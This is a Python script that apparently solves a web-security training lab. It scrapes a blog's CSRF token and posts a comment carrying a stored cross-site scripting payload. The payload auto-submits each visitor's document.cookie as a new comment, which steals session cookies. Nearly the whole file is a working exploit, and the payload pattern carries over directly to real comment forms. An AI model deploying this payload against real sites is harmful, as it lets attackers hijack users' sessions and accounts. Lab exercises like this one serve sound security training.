import requests
from bs4 import BeautifulSoup
s = requests.Session()
site = 'ac681f1f1ff4127d80a2393500bd0027.web-security-academy.net'

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''Hello'''

comment_xss = ''''<script>                                                                        
  document.addEventListener("DOMContentLoaded", function() {                      
  document.forms[0].name.value = 'Chance';                                           
  document.forms[0].email.value = 'spurgeonc>@sou.edu';                                
  document.forms[0].postId.value = 1;                                           
  document.forms[0].csrf.value = document.getElementsByName('csrf')[0].value;   
  document.forms[0].comment.value = document.cookie;                            
  document.forms[0].website.value = 'https://www.burpcollaborator.net';                          
  document.forms[0].submit();                                                   
});                                                                             
</script>'''

comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : f'beep {comment_xss}',
    'name' : 'Chance',
    'email' : 'spurgeonc@sou.edu',
    'website': f'''https://sou.edu'''
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)
